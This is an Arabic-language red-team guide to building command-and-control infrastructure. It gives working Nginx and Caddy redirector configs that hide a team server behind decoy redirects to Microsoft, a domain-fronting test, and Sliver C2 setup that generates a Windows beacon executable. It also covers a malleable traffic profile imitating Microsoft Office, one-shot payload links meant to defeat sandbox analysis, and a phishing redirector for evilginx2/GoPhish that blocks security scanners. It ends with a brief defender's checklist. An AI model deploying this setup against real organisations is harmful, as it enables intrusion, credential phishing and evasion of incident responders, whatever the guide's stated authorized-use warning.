# بناء البنية التحتية للعمليات الهجومية (Red Team Infrastructure)

تأسيس بنية تحتية للعمليات الهجومية قابلة لإعادة الإنتاج (Reproducible): تتكون من طبقات متعددة من الموجهات (Redirectors)، وخوادم تحكم وسيطرة (C2) محصنة، واستضافة الحمولات البرمجية (Payloads)، مع الحفاظ على نظافة سجلات الـ DNS و الـ TLS لضمان الصمود أمام فرق الاستجابة (Blue Teams) المتقدمة. هذا الدليل يمثل المخطط التشغيلي المتكامل لبناء هذه البيئة.

> [!warning] للعمليات المصرح بها فقط
> استخدام هذه البنية التحتية خارج نطاق العمليات المصرح بها يعد جريمة معلوماتية جسيمة (تخضع لقانون CFAA أو ما يعادله). يجب تخصيص بنية تحتية مستقلة لكل عملية، واعتبارها مؤقتة بالكامل (Ephemeral)، مع ضرورة تفكيكها فور انتهاء المهمة.

## الهندسة المعمارية (Architecture)

![بنية التحتية للفريق الأحمر](/images/lessons/redteam_infra_architecture_en.png)

## 1. الاستحواذ على الموارد الأساسية

```terminal
# اختيار مزودي الخوادم الافتراضية (VPS) المعروفين بسرعة التفعيل ودعم الدفع بالعملات الرقمية
# (يتم الاختيار بناءً على سياسات الاختصاص القضائي للعملية)

# سجلات الـ DNS — التسجيل عبر وسطاء يحافظون على الخصوصية (مثل Njalla أو OrangeWebsite)
# أولويات اختيار النطاق (Domain):
#  - نطاقات قديمة (Aged ≥ 2 years)، أو منتهية الصلاحية مع الحفاظ على تاريخها.
#  - نطاقات ذات سمعة سابقة طيبة (Benign).
#  - التأكد من تصنيف النطاق (Categorized) لدى أنظمة الحماية (Talos, Symantec, Forcepoint) قبل التنفيذ.

# التحقق من تصنيف النطاق:
curl -s 'https://talosintelligence.com/sb_api/query_lookup?query=...&query_entry=login-target-365.com'
```

## 2. تحصين المضيفين (الخط الأساسي للتأمين)

```terminal
# التحديثات وتثبيت الأدوات الأساسية
apt update && apt upgrade -y
apt install -y ufw fail2ban unattended-upgrades

# تأمين بروتوكول SSH — استخدام المفاتيح فقط، تغيير المنفذ الافتراضي، وتحديد المستخدمين المسموح لهم
sed -i 's/^#Port 22/Port 22222/' /etc/ssh/sshd_config
sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
echo "AllowUsers ops" >> /etc/ssh/sshd_config
systemctl restart ssh

# جدار الحماية (Firewall) — منع كل الاتصالات الواردة باستثناء ما تم التصريح به
ufw default deny incoming
ufw default allow outgoing
ufw allow from <BASTION_IP> to any port 22222
ufw allow 443/tcp
ufw enable

# تفعيل Fail2ban وضبط إعدادات الـ Kernel الأساسية
systemctl enable --now fail2ban
sysctl -w net.ipv4.tcp_syncookies=1
```

## 3. موجهات الطبقة الثانية (Nginx/Apache مع قواعد مرنة)

يقوم الموجه بإنهاء اتصال الـ TLS، وتصفية حركة المرور (Traffic Filtering)، وتوجيه الطلبات التي تبدو شرعية فقط إلى خادم الفريق (Team Server).

![منطق عمل الموجه](/images/lessons/redirector_logic_flow_en.png)


```terminal
# إعداد Nginx كموجه مع توجيه انتقائي
server {
    listen 443 ssl http2;
    server_name cdn-target-cache.com;
    ssl_certificate     /etc/letsencrypt/live/cdn-target-cache.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-target-cache.com/privkey.pem;

    # توجيه الطلبات المتوقعة فقط بناءً على مسارات محددة ووسيط مستخدم (User-Agent) معين
    location ~ ^/v1/(me/photo|users/|drive/items/) {
        if ($http_user_agent !~* "MSWAC|Microsoft Office") { return 444; }
        proxy_pass https://teamserver.internal:443;
        proxy_set_header Host teamserver.internal;
    }

    # صفحة تمويه للمحللين الأمنيين (Decoy)
    location / { return 302 https://www.microsoft.com/; }
}
```

> [!tip] صفحة التمويه هي ركيزة التوجيه
> إذا قام محلل من الفريق الأزرق بفتح النطاق في المتصفح، يجب أن يظهر له محتوى روتيني: تحويل لموقع ميكروسوفت، صفحة "تحت الصيانة"، أو نسخة من صفحة دخول مؤسسية. لا تسمح أبداً بكشف الرابط الحقيقي لخادم الـ C2.

## 4. تقنية التمويه بالنطاق (Domain Fronting)

تعتمد هذه التقنية (في حال توفرها) على استغلال شبكات توزيع المحتوى (CDNs) التي تسمح بعدم التطابق بين SNI و Host، مما يجعل اتصال الـ Beacon يبدو وكأنه يتحدث مع واجهة موثوقة (مثل خدمات SaaS شهيرة) بينما يصل في الحقيقة إلى خادمك.

```terminal
# اختبار استمرارية عمل التقنية مع مزود الـ CDN في عام 2026
# قامت شركات مثل CloudFront و Azure بتشديد السياسات، ولكن بعض المزودين المتخصصين لا يزالون يسمحون بها.
curl --resolve allowed-front.com:443:<CDN_IP> \
     https://allowed-front.com/ \
     -H "Host: your-cdn-distribution.cloudfront.net"
```

## 5. تثبيت خادم التحكم والسيطرة (C2 Server)

```terminal
# استخدام Sliver (إطار عمل حديث ومفتوح المصدر)
curl https://sliver.sh/install | sudo bash
sliver-server daemon &

# إنشاء ملف تعريف للمشغل (Operator Profile)
sliver-server operator --name op1 --lhost team.internal --save op1.cfg

# من محطة العمل الخاصة بك:
sliver-client import op1.cfg
sliver
> https --domain cdn-target-cache.com --lhost 0.0.0.0 --lport 443
> generate beacon --http https://cdn-target-cache.com --jitter 30 --seconds 60 \
                 --os windows --arch amd64 --format exe --save beacon.exe
```

### توصيف حركة مرور الـ Beacon

تطبيق ملف تعريف (Profile) يحاكي حركة المرور الشرعية:

```c
# ملف malleable.profile (بصيغة Cobalt Strike - نفس المبدأ في Sliver)
http-get "/v1/me/messages" {
    client {
        header "User-Agent" "Microsoft Office/16.0";
        metadata { netbiosu; base64url; uri-append; }
    }
    server {
        header "Content-Type" "application/json";
        output { netbiosu; print; }
    }
}
sleeptime 60000;
jitter 35;
```

## 6. مستضيف الحمولة البرمجية (Payload Host)

يجب أن يكون منفصلاً عن خادم الـ C2. تقدم الحمولات لمرة واحدة فقط، ثم يتم حجب الرابط.

```terminal
# استخدام Caddy مع معالج روابط للاستخدام الواحد (One-shot)
caddy file-server --root /srv/payloads --browse=false
# استخدام رابط فريد يعمل لمرة واحدة فقط:
http://payload-host/<UUID>?key=<PRESHARED>
# برمجية وسيطة لتسجيل عنوان الـ IP ووسيط المستخدم والطابع الزمني؛ وحذف الرابط فور الوصول الأول.
```

> [!info] أهمية الاستخدام الواحد (One-shot)
> إذا قام المدافع بسحب الحمولة بعد ساعة لتحليلها في بيئة معزولة (Sandbox)، فسيحصل على خطأ 404 بدلاً من البرمجية الخبيثة النشطة، مما يقلل من قدرة المحللين على اكتشاف العملية.

## 7. موجه عمليات التصيد (Phishing Redirector)

يعمل كواجهة أمام أدوات مثل evilginx2 أو GoPhish، ويقوم بالتصفية بناءً على:

- الموقع الجغرافي لعنوان الـ IP (حظر السحب الآلي من بيئات البحث المعروفة مثل VirusTotal و Hybrid Analysis).
- وسيط المستخدم (User-Agent) لرفض أدوات مثل curl أو wget.
- المصدر (Referer) وتوقيت الزيارة الأولى.
- القائمة البيضاء لأسماء الأنظمة المستقلة (ASN) الخاصة بالهدف فقط.

```terminal
# نموذج إعداد Caddy
@goodclient {
    not remote_ip 8.8.8.0/24 1.1.1.0/24 13.107.0.0/16  # حظر الماسحات المعروفة
    header User-Agent "Mozilla/*"
    not header User-Agent "*python*|*curl*|*HeadlessChrome*"
}
handle @goodclient { reverse_proxy https://phishlet.internal }
handle { redir https://www.microsoft.com 302 }
```

## 8. النظافة التشغيلية (Operational Hygiene)

| الممارسة | الأهمية |
|----------|-----|
| عملية واحدة = بنية تحتية واحدة | تجنب تلوث مؤشرات الاختراق (IOCs) عبر العمليات |
| نسخ احتياطية يومية (Snapshots) | ضمان الاستعادة السريعة في حال كشف أحد المضيفين |
| قائمة مراجعة التفكيك | مسح الأقراص، إلغاء الشهادات، حذف سجلات الـ DNS، وأرشفة السجلات مشفرة |
| تسجيل إجراءات المشغلين | توثيق جميع الأوامر المنفذة في سجلات تدقيق لكل مشغل |
| شهادات رقمية محددة زمنياً | تدوير آلي لشهادات Let's Encrypt؛ وضبط انتهاء الشهادات اليدوية |
| توقيع الكود لكل عنقود (Cluster) | حرق شهادة واحدة يؤدي لحرق عنقود واحد فقط وليس البرنامج بالكامل |

## 9. مفتاح الإيقاف الفوري (Kill Switch)

يجب تزويد كل عقدة بسكربت يتم تفعيله برسالة واحدة موقعة رقمياً للقيام بما يلي:

1. إيقاف جميع مستمعي الـ C2 (Listeners).
2. مسح حالة اتصالات الـ Beacon.
3. تدوير مفاتيح الـ SSH.
4. إعادة الموجهات إلى وضع التمويه الدائم (Decoy-only).

```bash
#!/bin/bash
set -e
systemctl stop sliver-server caddy
shred -uvz /opt/sliver/.sliver/teamserver.* 2>/dev/null
sed -i 's|reverse_proxy.*|return 302 https://microsoft.com|' /etc/caddy/Caddyfile
caddy reload
echo "infra parked $(date -u)" | logger -t redops
```

## تقدير التكلفة التشغيلية (Ballpark)

| المكون | التقدير الشهري ($) |
|-----------|-----------------|
| خادم القفز + خادم الفريق (4GB RAM) | $20 |
| 3 موجهات VPS (2GB RAM) | $30 |
| خادمان لاستضافة الحمولات | $20 |
| 4 نطاقات (Domains) | $50 (تدفع مرة واحدة) |
| نطاق قديم (Aged Domain) | $50–500 (تدفع مرة واحدة) |
| شهادة توقيع كود (EV) | $300–500 (تدفع مرة واحدة) |

تبلغ تكلفة البنية التحتية المتكاملة لعملية هجومية ما بين 100 إلى 150 دولاراً شهرياً، بالإضافة إلى تكاليف النطاقات والشهادات. مقارنة بتكلفة ثغرة يوم الصفر (0-day) التي قد تصل لسبعة أرقام، فإن البنية التحتية هي الجزء الأقل تكلفة.

## منظور المدافع (Defender's View)

عند البحث عن البنية التحتية للمهاجم أثناء الاستجابة للحوادث (IR):

- بيانات المسجل (WHOIS) وتاريخ تسجيل النطاقات المستخدمة.
- قائمة الأسماء البديلة (SAN) في الشهادة الرقمية - غالباً ما تسرب نطاقات أخرى في نفس العنقود.
- خدمات Cloudflare Radar أو سجلات الـ DNS السلبية (Passive DNS) لكشف الـ IP الحقيقي خلف التمويه.
- تاريخ تصنيف النطاق لدى Talos (تغيير التصنيف حديثاً يعد مؤشراً مريباً).
- بصمة الـ TLS (JA3 / JA3S) الخاصة بالـ Beacon - تساعد في تحديد عائلة إطار عمل الـ C2.
- روابط VirusTotal: البحث عن نفس مصدر الشهادة، أو بصمة الـ Favicon، أو الرقم المتسلسل لشهادة X.509.
